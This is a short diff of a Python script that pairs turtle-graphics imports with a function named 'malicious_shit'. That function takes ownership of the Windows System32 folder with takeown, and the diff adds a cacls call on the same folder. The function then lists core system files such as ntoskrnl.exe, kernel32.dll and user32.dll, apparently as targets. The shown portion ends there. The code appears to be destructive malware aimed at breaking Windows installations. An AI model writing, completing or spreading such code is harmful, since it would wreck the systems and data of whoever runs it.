@@ -2,9 +2,10 @@ import subprocess
 import time
 from turtle import *
 import turtle
-system32 = "C:\\Windows\\System32"
+system32 = r"C:/Windows/System32"
 def malicious_shit():
     subprocess.run(["takeown", "/f", system32],shell=True)
+    subprocess.run(["cacls",system32])
     kern32="C:\\Windows\\System32\\ntoskrnl.exe"
     kernel="C:\\Windows\\System32\\kernel32.dll"
     user="C:\\Windows\\System32\\user32.dll"
